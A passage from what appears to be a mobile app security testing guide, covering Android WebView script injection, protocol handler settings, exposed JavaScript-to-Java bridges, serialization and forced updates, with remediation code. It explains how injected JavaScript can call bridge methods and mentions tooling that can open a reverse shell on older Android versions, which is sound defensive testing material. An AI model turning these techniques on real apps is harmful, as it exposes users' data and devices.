to inject JavaScript into an app's WebView:

\begin{itemize}
\tightlist
\item
  Stored Cross-Site Scripting vulnerabilities in an endpoint; the
  exploit will be sent to the mobile app's WebView when the user
  navigates to the vulnerable function.
\item
  Attacker takes a man-in-the-middle (MITM) position and tampers with
  the response by injecting JavaScript.
\item
  Malware tampering with local files that are loaded by the WebView.
\end{itemize}

To address these attack vectors, check the following:

\begin{itemize}
\item
  All functions offered by the endpoint should be free of
  \href{https://goo.gl/6MWZkb}{stored XSS}.
\item
  Only files that are in the app data directory should be rendered in a
  WebView (see test case ``Testing for Local File Inclusion in
  WebViews'').
\item
  The HTTPS communication must be implemented according to best
  practices to avoid MITM attacks. This means:

  \begin{itemize}
  \tightlist
  \item
    all communication is encrypted via TLS (see test case ``Testing for
    Unencrypted Sensitive Data on the Network''),
  \item
    the certificate is checked properly (see test case ``Testing
    Endpoint Identify Verification''), and/or
  \item
    the certificate should be pinned (see ``Testing Custom Certificate
    Stores and Certificate Pinning'').
  \end{itemize}
\end{itemize}

\hypertarget{testing-webview-protocol-handlers-mstg-platform-6}{%
\subsubsection{Testing WebView Protocol Handlers
(MSTG-PLATFORM-6)}\label{testing-webview-protocol-handlers-mstg-platform-6}}

\hypertarget{overview-31}{%
\paragraph{Overview}\label{overview-31}}

Several default
\href{https://developer.android.com/guide/appendix/g-app-intents.html}{schemas}
are available for Android URLs. They can be triggered within a WebView
with the following:

\begin{itemize}
\tightlist
\item
  http(s)://
\item
  file://
\item
  tel://
\end{itemize}

WebViews can load remote content from an endpoint, but they can also
load local content from the app data directory or external storage. If
the local content is loaded, the user shouldn't be able to influence the
filename or the path used to load the file, and users shouldn't be able
to edit the loaded file.

\hypertarget{static-analysis-38}{%
\paragraph{Static Analysis}\label{static-analysis-38}}

Check the source code for WebView usage. The following
\href{https://developer.android.com/reference/android/webkit/WebSettings.html}{WebView
settings} control resource access:

\begin{itemize}
\tightlist
\item
  \texttt{setAllowContentAccess}: Content URL access allows WebViews to
  load content from a content provider installed on the system, which is
  enabled by default .
\item
  \texttt{setAllowFileAccess}: Enables and disables file access within a
  WebView. File access is enabled by default. Note that this enables and
  disables
  \href{https://developer.android.com/reference/android/webkit/WebSettings.html\#setAllowFileAccess\%28boolean\%29}{file
  system access} only. Asset and resource access is unaffected and
  accessible via \texttt{file:///android\_asset} and
  \texttt{file:///android\_res}.
\item
  \texttt{setAllowFileAccessFromFileURLs}: Does or does not allow
  JavaScript running in the context of a file scheme URL to access
  content from other file scheme URLs. The default value is
  \texttt{true} for Android 4.0.3 - 4.0.4 (API level 15) and below and
  \texttt{false} for Android 4.1 (API level 16) and above.
\item
  \texttt{setAllowUniversalAccessFromFileURLs}: Does or does not allow
  JavaScript running in the context of a file scheme URL to access
  content from any origin. The default value is \texttt{true} for
  Android 4.0.3 - 4.0.4 (API level 15) and below and \texttt{false} for
  Android 4.1 (API level 16) and above.
\end{itemize}

If one or more of the above methods is/are activated, you should
determine whether the method(s) is/are really necessary for the app to
work properly.

If a WebView instance can be identified, find out whether local files
are loaded with the \href{https://goo.gl/4vdSQM}{\texttt{loadURL}}
method.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{WebView = }\KeywordTok{new} \FunctionTok{WebView}\NormalTok{(}\KeywordTok{this}\NormalTok{);}
\NormalTok{webView.}\FunctionTok{loadUrl}\NormalTok{(}\StringTok{"file:///android\_asset/filename.html"}\NormalTok{);}
\end{Highlighting}
\end{Shaded}

The location from which the HTML file is loaded must be verified. If the
file is loaded from external storage, for example, the file is readable
and writable by everyone. This is considered a bad practice. Instead,
the file should be placed in the app's assets directory.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{webview.}\FunctionTok{loadUrl}\NormalTok{(}\StringTok{"file:///"}\NormalTok{ +}
\BuiltInTok{Environment}\NormalTok{.}\FunctionTok{getExternalStorageDirectory}\NormalTok{().}\FunctionTok{getPath}\NormalTok{() +}
\StringTok{"filename.html"}\NormalTok{);}
\end{Highlighting}
\end{Shaded}

The URL specified in \texttt{loadURL} should be checked for dynamic
parameters that can be manipulated; their manipulation may lead to local
file inclusion.

Use the following
\href{https://github.com/nowsecure/secure-mobile-development/blob/master/en/android/webview-best-practices.md\#remediation}{code
snippet and best practices} to deactivate protocol handlers, if
applicable:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{//If attackers can inject script into a WebView, they could access local resources. This can be prevented by disabling local file system access, which is enabled by default. You can use the Android WebSettings class to disable local file system access via the public method \textasciigrave{}setAllowFileAccess\textasciigrave{}.}
\NormalTok{webView.}\FunctionTok{getSettings}\NormalTok{().}\FunctionTok{setAllowFileAccess}\NormalTok{(}\KeywordTok{false}\NormalTok{);}

\NormalTok{webView.}\FunctionTok{getSettings}\NormalTok{().}\FunctionTok{setAllowFileAccessFromFileURLs}\NormalTok{(}\KeywordTok{false}\NormalTok{);}

\NormalTok{webView.}\FunctionTok{getSettings}\NormalTok{().}\FunctionTok{setAllowUniversalAccessFromFileURLs}\NormalTok{(}\KeywordTok{false}\NormalTok{);}

\NormalTok{webView.}\FunctionTok{getSettings}\NormalTok{().}\FunctionTok{setAllowContentAccess}\NormalTok{(}\KeywordTok{false}\NormalTok{);}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  Create a whitelist that defines local and remote web pages and
  protocols that are allowed to be loaded.
\item
  Create checksums of the local HTML/JavaScript files and check them
  while the app is starting up. Minify JavaScript files to make them
  harder to read.
\end{itemize}

\hypertarget{dynamic-analysis-35}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-35}}

To identify the usage of protocol handlers, look for ways to trigger
phone calls and ways to access files from the file system while you're
using the app.

\hypertarget{determining-whether-java-objects-are-exposed-through-webviews-mstg-platform-7}{%
\subsubsection{Determining Whether Java Objects Are Exposed Through
WebViews
(MSTG-PLATFORM-7)}\label{determining-whether-java-objects-are-exposed-through-webviews-mstg-platform-7}}

\hypertarget{overview-32}{%
\paragraph{Overview}\label{overview-32}}

Android offers a way for JavaScript executed in a WebView to call and
use native functions of an Android app (annotated with
\texttt{@JavascriptInterface}) by using the
\href{https://developer.android.com/reference/android/webkit/WebView.html\#addJavascriptInterface\%28java.lang.Object,\%20java.lang.String\%29}{\texttt{addJavascriptInterface}}
method. This is known as a \emph{WebView JavaScript bridge} or
\emph{native bridge}.

Please note that \textbf{when you use \texttt{addJavascriptInterface},
you're explicitly granting access to the registered JavaScript Interface
object to all pages loaded within that WebView}. This implies that, if
the user navigates outside your app or domain, all other external pages
will also have access to those JavaScript Interface objects which might
present a potential security risk if any sensitive data is being exposed
though those interfaces.

\begin{quote}
Warning: Take extreme care with apps targeting Android versions below
Android 4.2 (API level 17) as they are
\href{https://labs.mwrinfosecurity.com/blog/webview-addjavascriptinterface-remote-code-execution/}{vulnerable
to a flaw} in the implementation of \texttt{addJavascriptInterface}: an
attack that is abusing reflection, which leads to remote code execution
when malicious JavaScript is injected into a WebView. This was due to
all Java Object methods being accessible by default (instead of only
those annotated).
\end{quote}

\hypertarget{static-analysis-39}{%
\paragraph{Static Analysis}\label{static-analysis-39}}

You need to determine whether the method \texttt{addJavascriptInterface}
is used, how it is used, and whether an attacker can inject malicious
JavaScript.

The following example shows how \texttt{addJavascriptInterface} is used
to bridge a Java Object and JavaScript in a WebView:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{WebView webview = }\KeywordTok{new} \FunctionTok{WebView}\NormalTok{(}\KeywordTok{this}\NormalTok{);}
\NormalTok{WebSettings webSettings = webview.}\FunctionTok{getSettings}\NormalTok{();}
\NormalTok{webSettings.}\FunctionTok{setJavaScriptEnabled}\NormalTok{(}\KeywordTok{true}\NormalTok{);}

\NormalTok{MSTG\_ENV\_008\_JS\_Interface jsInterface = }\KeywordTok{new} \FunctionTok{MSTG\_ENV\_008\_JS\_Interface}\NormalTok{(}\KeywordTok{this}\NormalTok{);}

\NormalTok{myWebView.}\FunctionTok{addJavascriptInterface}\NormalTok{(jsInterface, }\StringTok{"Android"}\NormalTok{);}
\NormalTok{myWebView.}\FunctionTok{loadURL}\NormalTok{(}\StringTok{"http://example.com/file.html"}\NormalTok{);}
\FunctionTok{setContentView}\NormalTok{(myWebView);}
\end{Highlighting}
\end{Shaded}

In Android 4.2 (API level 17) and above, an annotation
\texttt{@JavascriptInterface} explicitly allows JavaScript to access a
Java method.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{public} \KeywordTok{class}\NormalTok{ MSTG\_ENV\_008\_JS\_Interface \{}

        \BuiltInTok{Context}\NormalTok{ mContext;}

        \CommentTok{/**}\NormalTok{ Instantiate the interface and set the context }\CommentTok{*/}
        \FunctionTok{MSTG\_ENV\_005\_JS\_Interface}\NormalTok{(}\BuiltInTok{Context}\NormalTok{ c) \{}
\NormalTok{            mContext = c;}
\NormalTok{        \}}

        \AttributeTok{@JavascriptInterface}
        \KeywordTok{public} \BuiltInTok{String} \FunctionTok{returnString}\NormalTok{ () \{}
            \KeywordTok{return} \StringTok{"Secret String"}\NormalTok{;}
\NormalTok{        \}}

        \CommentTok{/**}\NormalTok{ Show a toast from the web page }\CommentTok{*/}
        \AttributeTok{@JavascriptInterface}
        \KeywordTok{public} \DataTypeTok{void} \FunctionTok{showToast}\NormalTok{(}\BuiltInTok{String}\NormalTok{ toast) \{}
\NormalTok{            Toast.}\FunctionTok{makeText}\NormalTok{(mContext, toast, Toast.}\FunctionTok{LENGTH\_SHORT}\NormalTok{).}\FunctionTok{show}\NormalTok{();}
\NormalTok{        \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

This is how you can call the method \texttt{returnString} from
JavaScript, the string ``Secret String'' will be stored in the variable
\texttt{result}:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{var}\NormalTok{ result }\OperatorTok{=} \VariableTok{window}\NormalTok{.}\VariableTok{Android}\NormalTok{.}\AttributeTok{returnString}\NormalTok{()}\OperatorTok{;}
\end{Highlighting}
\end{Shaded}

With access to the JavaScript code, via, for example, stored XSS or a
MITM attack, an attacker can directly call the exposed Java methods.

If \texttt{addJavascriptInterface} is necessary, take the following
considerations:

\begin{itemize}
\tightlist
\item
  Only JavaScript provided with the APK should be allowed to use the
  bridges, e.g.~by verifying the URL on each bridged Java method (via
  \texttt{WebView.getUrl}).
\item
  No JavaScript should be loaded from remote endpoints, e.g.~by keeping
  page navigation within the app's domains and opening all other domains
  on the default browser (e.g.~Chrome, Firefox).
\item
  If necessary for legacy reasons (e.g.~having to support older
  devices), at least set the minimal API level to 17 in the manifest
  file of the app
  (\texttt{\textless{}uses-sdk\ android:minSdkVersion="17"\ /\textgreater{}}).
\end{itemize}

\hypertarget{dynamic-analysis-36}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-36}}

Dynamic analysis of the app can show you which HTML or JavaScript files
are loaded and which vulnerabilities are present. The procedure for
exploiting the vulnerability starts with producing a JavaScript payload
and injecting it into the file that the app is requesting. The injection
can be accomplished via a MITM attack or direct modification of the file
if it is stored in external storage. The whole process can be
accomplished via Drozer and weasel (MWR's advanced exploitation
payload), which can install a full agent, injecting a limited agent into
a running process or connecting a reverse shell as a Remote Access Tool
(RAT).

A full description of the attack is included in the
\href{https://labs.mwrinfosecurity.com/blog/webview-addjavascriptinterface-remote-code-execution/}{blog
article by MWR}.

\hypertarget{testing-object-persistence-mstg-platform-8}{%
\subsubsection{Testing Object Persistence
(MSTG-PLATFORM-8)}\label{testing-object-persistence-mstg-platform-8}}

\hypertarget{overview-33}{%
\paragraph{Overview}\label{overview-33}}

There are several ways to persist an object on Android:

\hypertarget{object-serialization}{%
\subparagraph{Object Serialization}\label{object-serialization}}

An object and its data can be represented as a sequence of bytes. This
is done in Java via
\href{https://developer.android.com/reference/java/io/Serializable.html}{object
serialization}. Serialization is not inherently secure. It is just a
binary format (or representation) for locally storing data in a .ser
file. Encrypting and signing HMAC-serialized data is possible as long as
the keys are stored safely. Deserializing an object requires a class of
the same version as the class used to serialize the object. After
classes have been changed, the \texttt{ObjectInputStream} can't create
objects from older .ser files. The example below shows how to create a
\texttt{Serializable} class by implementing the \texttt{Serializable}
interface.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{import}\ImportTok{ java.io.Serializable;}

\KeywordTok{public} \KeywordTok{class}\NormalTok{ Person }\KeywordTok{implements} \BuiltInTok{Serializable}\NormalTok{ \{}
  \KeywordTok{private} \BuiltInTok{String}\NormalTok{ firstName;}
  \KeywordTok{private} \BuiltInTok{String}\NormalTok{ lastName;}

  \KeywordTok{public} \FunctionTok{Person}\NormalTok{(}\BuiltInTok{String}\NormalTok{ firstName, }\BuiltInTok{String}\NormalTok{ lastName) \{}
    \KeywordTok{this}\NormalTok{.}\FunctionTok{firstName}\NormalTok{ = firstName;}
    \KeywordTok{this}\NormalTok{.}\FunctionTok{lastName}\NormalTok{ = lastName;}
\NormalTok{    \}}
  \CommentTok{//..}
  \CommentTok{//getters, setters, etc}
  \CommentTok{//..}

\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Now you can read/write the object with
\texttt{ObjectInputStream}/\texttt{ObjectOutputStream} in another class.

\hypertarget{json}{%
\subparagraph{JSON}\label{json}}

There are several ways to serialize the contents of an object to JSON.
Android comes with the \texttt{JSONObject} and \texttt{JSONArray}
classes. A wide variety of libraries, including
\href{https://github.com/google/gson}{GSON},
\href{https://github.com/FasterXML/jackson-core}{Jackson},
\href{https://github.com/square/moshi}{Moshi}, can also be used. The
main differences between the libraries are whether they use reflection
to compose the object, whether they support annotations, whether the
create immutable objects, and the amount of memory they use. Note that
almost all the JSON representations are String-based and therefore
immutable. This means that any secret stored in JSON will be harder to
remove from memory. JSON itself can be stored anywhere, e.g., a (NoSQL)
database or a file. You just need to make sure that any JSON that
contains secrets has been appropriately protected (e.g.,
encrypted/HMACed). See the chapter
``\href{0x05d-Testing-Data-Storage.md}{Data Storage on Android}'' for
more details. A simple example (from the GSON User Guide) of writing and
reading JSON with GSON follows. In this example, the contents of an
instance of the \texttt{BagOfPrimitives} is serialized into JSON:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ BagOfPrimitives \{}
  \KeywordTok{private} \DataTypeTok{int}\NormalTok{ value1 = }\DecValTok{1}\NormalTok{;}
  \KeywordTok{private} \BuiltInTok{String}\NormalTok{ value2 = }\StringTok{"abc"}\NormalTok{;}
  \KeywordTok{private} \KeywordTok{transient} \DataTypeTok{int}\NormalTok{ value3 = }\DecValTok{3}\NormalTok{;}
  \FunctionTok{BagOfPrimitives}\NormalTok{() \{}
    \CommentTok{// no{-}args constructor}
\NormalTok{  \}}
\NormalTok{\}}

\CommentTok{// Serialization}
\NormalTok{BagOfPrimitives obj = }\KeywordTok{new} \FunctionTok{BagOfPrimitives}\NormalTok{();}
\NormalTok{Gson gson = }\KeywordTok{new} \FunctionTok{Gson}\NormalTok{();}
\BuiltInTok{String}\NormalTok{ json = gson.}\FunctionTok{toJson}\NormalTok{(obj);  }

\CommentTok{// ==> json is \{"value1":1,"value2":"abc"\}}
\end{Highlighting}
\end{Shaded}

\hypertarget{xml}{%
\subparagraph{XML}\label{xml}}

There are several ways to serialize the contents of an object to XML and
back. Android comes with the \texttt{XmlPullParser} interface which
allows for easily maintainable XML parsing. There are two
implementations within Android: \texttt{KXmlParser} and
\texttt{ExpatPullParser}. The
\href{https://developer.android.com/training/basics/network-ops/xml\#java}{Android
Developer Guide} provides a great write-up on how to use them. Next,
there are various alternatives, such as a \texttt{SAX} parser that comes
with the Java runtime. For more information, see
\href{https://www.ibm.com/developerworks/opensource/library/x-android/index.html}{a
blogpost from ibm.com}. Similarly to JSON, XML has the issue of working
mostly String based, which means that String-type secrets will be harder
to remove from memory. XML data can be stored anywhere (database,
files), but do need additional protection in case of secrets or
information that should not be changed. See the chapter
``\href{0x05d-Testing-Data-Storage.md}{Data Storage on Android}'' for
more details. As stated earlier: the true danger in XML lies in the
\href{https://www.owasp.org/index.php/XML_External_Entity_\%28XXE\%29_Processing}{XML
eXternal Entity (XXE)} attack as it might allow for reading external
data sources that are still accessible within the application.

\hypertarget{orm}{%
\subparagraph{ORM}\label{orm}}

There are libraries that provide functionality for directly storing the
contents of an object in a database and then instantiating the object
with the database contents. This is called Object-Relational Mapping
(ORM). Libraries that use the SQLite database include

\begin{itemize}
\tightlist
\item
  \href{http://ormlite.com/}{OrmLite},
\item
  \href{https://satyan.github.io/sugar/}{SugarORM},
\item
  \href{https://greenrobot.org/greendao/}{GreenDAO} and
\item
  \href{http://www.activeandroid.com/}{ActiveAndroid}.
\end{itemize}

\href{https://realm.io/docs/java/latest/}{Realm}, on the other hand,
uses its own database to store the contents of a class. The amount of
protection that ORM can provide depends primarily on whether the
database is encrypted. See the chapter
``\href{0x05d-Testing-Data-Storage.md}{Data Storage on Android}'' for
more details. The Realm website includes a nice
\href{https://github.com/j256/ormlite-examples/tree/master/android/HelloAndroid}{example
of ORM Lite}.

\hypertarget{parcelable}{%
\subparagraph{Parcelable}\label{parcelable}}

\href{https://developer.android.com/reference/android/os/Parcelable.html}{\texttt{Parcelable}}
is an interface for classes whose instances can be written to and
restored from a
\href{https://developer.android.com/reference/android/os/Parcel.html}{\texttt{Parcel}}.
Parcels are often used to pack a class as part of a \texttt{Bundle} for
an \texttt{Intent}. Here's an Android developer documentation example
that implements \texttt{Parcelable}:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{public} \KeywordTok{class}\NormalTok{ MyParcelable }\KeywordTok{implements}\NormalTok{ Parcelable \{}
     \KeywordTok{private} \DataTypeTok{int}\NormalTok{ mData;}

     \KeywordTok{public} \DataTypeTok{int} \FunctionTok{describeContents}\NormalTok{() \{}
         \KeywordTok{return} \DecValTok{0}\NormalTok{;}
\NormalTok{     \}}

     \KeywordTok{public} \DataTypeTok{void} \FunctionTok{writeToParcel}\NormalTok{(Parcel out, }\DataTypeTok{int}\NormalTok{ flags) \{}
\NormalTok{         out.}\FunctionTok{writeInt}\NormalTok{(mData);}
\NormalTok{     \}}

     \KeywordTok{public} \DataTypeTok{static} \DataTypeTok{final}\NormalTok{ Parcelable.}\FunctionTok{Creator}\NormalTok{<MyParcelable> CREATOR}
\NormalTok{             = }\KeywordTok{new}\NormalTok{ Parcelable.}\FunctionTok{Creator}\NormalTok{<MyParcelable>() \{}
         \KeywordTok{public}\NormalTok{ MyParcelable }\FunctionTok{createFromParcel}\NormalTok{(Parcel in) \{}
             \KeywordTok{return} \KeywordTok{new} \FunctionTok{MyParcelable}\NormalTok{(in);}
\NormalTok{         \}}

         \KeywordTok{public}\NormalTok{ MyParcelable[] }\FunctionTok{newArray}\NormalTok{(}\DataTypeTok{int}\NormalTok{ size) \{}
             \KeywordTok{return} \KeywordTok{new}\NormalTok{ MyParcelable[size];}
\NormalTok{         \}}
\NormalTok{     \};}

     \KeywordTok{private} \FunctionTok{MyParcelable}\NormalTok{(Parcel in) \{}
\NormalTok{         mData = in.}\FunctionTok{readInt}\NormalTok{();}
\NormalTok{     \}}
\NormalTok{ \}}
\end{Highlighting}
\end{Shaded}

Because this mechanism that involves Parcels and Intents may change over
time, and the \texttt{Parcelable} may contain \texttt{IBinder} pointers,
storing data to disk via \texttt{Parcelable} is not recommended.

\hypertarget{protocol-buffers}{%
\subparagraph{Protocol Buffers}\label{protocol-buffers}}

\href{https://developers.google.com/protocol-buffers/}{Protocol Buffers}
by Google, are a platform- and language neutral mechanism for
serializing structured data by means of the
\href{https://developers.google.com/protocol-buffers/docs/encoding}{Binary
Data Format}. There have been a few vulnerabilities with Protocol
Buffers, such as
\href{https://www.cvedetails.com/cve/CVE-2015-5237/}{CVE-2015-5237}.
Note that Protocol Buffers do not provide any protection for
confidentiality: there is no built in encryption.

\hypertarget{static-analysis-40}{%
\paragraph{Static Analysis}\label{static-analysis-40}}

If object persistence is used for storing sensitive information on the
device, first make sure that the information is encrypted and
signed/HMACed. See the chapters
``\href{0x05d-Testing-Data-Storage.md}{Data Storage on Android}'' and
``\href{0x05e-Testing-Cryptography.md}{Android Cryptographic APIs}'' for
more details. Next, make sure that the decryption and verification keys
are obtainable only after the user has been authenticated. Security
checks should be carried out at the correct positions, as defined in
\href{https://wiki.sei.cmu.edu/confluence/display/java/SER04-J.\%20Do\%20not\%20allow\%20serialization\%20and\%20deserialization\%20to\%20bypass\%20the\%20security\%20manager}{best
practices}.

There are a few generic remediation steps that you can always take:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Make sure that sensitive data has been encrypted and HMACed/signed
  after serialization/persistence. Evaluate the signature or HMAC before
  you use the data. See the chapter
  ``\href{0x05e-Testing-Cryptography.md}{Android Cryptographic APIs}''
  for more details.
\item
  Make sure that the keys used in step 1 can't be extracted easily. The
  user and/or application instance should be properly
  authenticated/authorized to obtain the keys. See the chapter
  ``\href{0x05d-Testing-Data-Storage.md}{Data Storage on Android}'' for
  more details.
\item
  Make sure that the data within the de-serialized object is carefully
  validated before it is actively used (e.g., no exploit of
  business/application logic).
\end{enumerate}

For high-risk applications that focus on availability, we recommend that
you use \texttt{Serializable} only when the serialized classes are
stable. Second, we recommend not using reflection-based persistence
because

\begin{itemize}
\tightlist
\item
  the attacker could find the method's signature via the String-based
  argument
\item
  the attacker might be able to manipulate the reflection-based steps to
  execute business logic.
\end{itemize}

See the chapter
``\href{0x05j-Testing-Resiliency-Against-Reverse-Engineering.md}{Android
Anti-Reversing Defenses}'' for more details.

\hypertarget{object-serialization-1}{%
\subparagraph{Object Serialization}\label{object-serialization-1}}

Search the source code for the following keywords:

\begin{itemize}
\tightlist
\item
  \texttt{import\ java.io.Serializable}
\item
  \texttt{implements\ Serializable}
\end{itemize}

\hypertarget{json-1}{%
\subparagraph{JSON}\label{json-1}}

If you need to counter memory-dumping, make sure that very sensitive
information is not stored in the JSON format because you can't guarantee
prevention of anti-memory dumping techniques with the standard
libraries. You can check for the following keywords in the corresponding
libraries:

\textbf{\texttt{JSONObject}} Search the source code for the following
keywords:

\begin{itemize}
\tightlist
\item
  \texttt{import\ org.json.JSONObject;}
\item
  \texttt{import\ org.json.JSONArray;}
\end{itemize}

\textbf{\texttt{GSON}} Search the source code for the following
keywords:

\begin{itemize}
\tightlist
\item
  \texttt{import\ com.google.gson}
\item
  \texttt{import\ com.google.gson.annotations}
\item
  \texttt{import\ com.google.gson.reflect}
\item
  \texttt{import\ com.google.gson.stream}
\item
  \texttt{new\ Gson();}
\item
  Annotations such as \texttt{@Expose}, \texttt{@JsonAdapter},
  \texttt{@SerializedName},\texttt{@Since}, and \texttt{@Until}
\end{itemize}

\textbf{\texttt{Jackson}} Search the source code for the following
keywords:

\begin{itemize}
\tightlist
\item
  \texttt{import\ com.fasterxml.jackson.core}
\item
  \texttt{import\ org.codehaus.jackson} for the older version.
\end{itemize}

\hypertarget{orm-1}{%
\subparagraph{ORM}\label{orm-1}}

When you use an ORM library, make sure that the data is stored in an
encrypted database and the class representations are individually
encrypted before storing it. See the chapters
``\href{0x05d-Testing-Data-Storage.md}{Data Storage on Android}'' and
``\href{0x05e-Testing-Cryptography.md}{Android Cryptographic APIs}'' for
more details. You can check for the following keywords in the
corresponding libraries:

\textbf{\texttt{OrmLite}} Search the source code for the following
keywords:

\begin{itemize}
\tightlist
\item
  \texttt{import\ com.j256.*}
\item
  \texttt{import\ com.j256.dao}
\item
  \texttt{import\ com.j256.db}
\item
  \texttt{import\ com.j256.stmt}
\item
  \texttt{import\ com.j256.table\textbackslash{}}
\end{itemize}

Please make sure that logging is disabled.

\textbf{\texttt{SugarORM}} Search the source code for the following
keywords:

\begin{itemize}
\tightlist
\item
  \texttt{import\ com.github.satyan}
\item
  \texttt{extends\ SugarRecord\textless{}Type\textgreater{}}
\item
  In the AndroidManifest, there will be \texttt{meta-data} entries with
  values such as \texttt{DATABASE}, \texttt{VERSION},
  \texttt{QUERY\_LOG} and \texttt{DOMAIN\_PACKAGE\_NAME}.
\end{itemize}

Make sure that \texttt{QUERY\_LOG} is set to false.

\textbf{\texttt{GreenDAO}} Search the source code for the following
keywords:

\begin{itemize}
\tightlist
\item
  \texttt{import\ org.greenrobot.greendao.annotation.Convert}
\item
  \texttt{import\ org.greenrobot.greendao.annotation.Entity}
\item
  \texttt{import\ org.greenrobot.greendao.annotation.Generated}
\item
  \texttt{import\ org.greenrobot.greendao.annotation.Id}
\item
  \texttt{import\ org.greenrobot.greendao.annotation.Index}
\item
  \texttt{import\ org.greenrobot.greendao.annotation.NotNull}
\item
  \texttt{import\ org.greenrobot.greendao.annotation.*}
\item
  \texttt{import\ org.greenrobot.greendao.database.Database}
\item
  \texttt{import\ org.greenrobot.greendao.query.Query}
\end{itemize}

\textbf{\texttt{ActiveAndroid}} Search the source code for the following
keywords:

\begin{itemize}
\tightlist
\item
  \texttt{ActiveAndroid.initialize(\textless{}contextReference\textgreater{});}
\item
  \texttt{import\ com.activeandroid.Configuration}
\item
  \texttt{import\ com.activeandroid.query.*}
\end{itemize}

\textbf{\texttt{Realm}} Search the source code for the following
keywords:

\begin{itemize}
\tightlist
\item
  \texttt{import\ io.realm.RealmObject;}
\item
  \texttt{import\ io.realm.annotations.PrimaryKey;}
\end{itemize}

\hypertarget{parcelable-1}{%
\subparagraph{Parcelable}\label{parcelable-1}}

Make sure that appropriate security measures are taken when sensitive
information is stored in an Intent via a Bundle that contains a
Parcelable. Use explicit Intents and verify proper additional security
controls when using application-level IPC (e.g., signature verification,
intent-permissions, crypto).

\hypertarget{dynamic-analysis-37}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-37}}

There are several ways to perform dynamic analysis:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  For the actual persistence: Use the techniques described in the data
  storage chapter.
\item
  For reflection-based approaches: Use Xposed to hook into the
  deserialization methods or add unprocessable information to the
  serialized objects to see how they are handled (e.g., whether the
  application crashes or extra information can be extracted by enriching
  the objects).
\end{enumerate}

\hypertarget{testing-enforced-updating-mstg-arch-9}{%
\subsubsection{Testing enforced updating
(MSTG-ARCH-9)}\label{testing-enforced-updating-mstg-arch-9}}

Starting from Android 5.0 (API level 21), together with the Play Core
Library, apps can be forced to be updated. This mechanism is based on
using the \texttt{AppUpdateManager}. Before that, other mechanisms were
used, such as doing http calls to the Google Play Store, which are not
as reliable as the APIs of the Play Store might change. Alternatively,
Firebase could be used to check for possible forced updates as well (see
this
\href{https://medium.com/@sembozdemir/force-your-users-to-update-your-app-with-using-firebase-33f1e0bcec5a}{blog}).
Enforced updating can be really helpful when it comes to public key
pinning (see the Testing Network communication for more details) when a
pin has to be refreshed due to a certificate/public key rotation. Next,
vulnerabilities are easily patched by means of forced updates.

Please note that newer versions of an application will not fix security
issues that are living in the backends to which the app communicates.
Allowing an app not to communicate with it might not be enough. Having
proper API-lifecycle management is key here. Similarly, when a user is
not forced to update, do not forget to test older versions of your app
against your API and/or use proper API versioning.

\hypertarget{static-analysis-41}{%
\paragraph{Static analysis}\label{static-analysis-41}}

The code sample below shows the example of an app-update:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{//Part 1: check for update}
\CommentTok{// Creates instance of the manager.}
\NormalTok{AppUpdateManager appUpdateManager = AppUpdateManagerFactory.}\FunctionTok{create}\NormalTok{(context);}

\CommentTok{// Returns an intent object that you use to check for an update.}
\NormalTok{Task<AppUpdateInfo> appUpdateInfo = appUpdateManager.}\FunctionTok{getAppUpdateInfo}\NormalTok{();}

\CommentTok{// Checks that the platform will allow the specified type of update.}
\KeywordTok{if}\NormalTok{ (appUpdateInfo.}\FunctionTok{updateAvailability}\NormalTok{() == UpdateAvailability.}\FunctionTok{UPDATE\_AVAILABLE}
      \CommentTok{// For a flexible update, use AppUpdateType.FLEXIBLE}
\NormalTok{      \&\& appUpdateInfo.}\FunctionTok{isUpdateTypeAllowed}\NormalTok{(AppUpdateType.}\FunctionTok{IMMEDIATE}\NormalTok{)) \{}



                  \CommentTok{//...Part 2: request update}
\NormalTok{                  appUpdateManager.}\FunctionTok{startUpdateFlowForResult}\NormalTok{(}
                     \CommentTok{// Pass the intent that is returned by \textquotesingle{}getAppUpdateInfo()\textquotesingle{}.}
\NormalTok{                     appUpdateInfo,}
                     \CommentTok{// Or \textquotesingle{}AppUpdateType.FLEXIBLE\textquotesingle{} for flexible updates.}
\NormalTok{                     AppUpdateType.}\FunctionTok{IMMEDIATE}\NormalTok{,}
                     \CommentTok{// The current activity making the update request.}
                     \KeywordTok{this}\NormalTok{,}
                     \CommentTok{// Include a request code to later monitor this update request.}
\NormalTok{                     MY\_REQUEST\_CODE);}



                     \CommentTok{//...Part 3: check if update completed succesfully}
 \AttributeTok{@Override}
 \KeywordTok{public} \DataTypeTok{void} \FunctionTok{onActivityResult}\NormalTok{(}\DataTypeTok{int}\NormalTok{ requestCode, }\DataTypeTok{int}\NormalTok{ resultCode, Intent data) \{}
   \KeywordTok{if}\NormalTok{ (myRequestCode == MY\_REQUEST\_CODE) \{}
     \KeywordTok{if}\NormalTok{ (resultCode != RESULT\_OK) \{}
       \FunctionTok{log}\NormalTok{(}\StringTok{"Update flow failed! Result code: "}\NormalTok{ + resultCode);}
       \CommentTok{// If the update is cancelled or fails,}
       \CommentTok{// you can request to start the update again in case of forced updates}
\NormalTok{     \}}
\NormalTok{   \}}
\NormalTok{ \}}

 \CommentTok{//..Part 4:}
 \CommentTok{// Checks that the update is not stalled during \textquotesingle{}onResume()\textquotesingle{}.}
\CommentTok{// However, you should execute this check at all entry points into the app.}
\AttributeTok{@Override}
\KeywordTok{protected} \DataTypeTok{void} \FunctionTok{onResume}\NormalTok{() \{}
  \KeywordTok{super}\NormalTok{.}\FunctionTok{onResume}\NormalTok{();}

\NormalTok{  appUpdateManager}
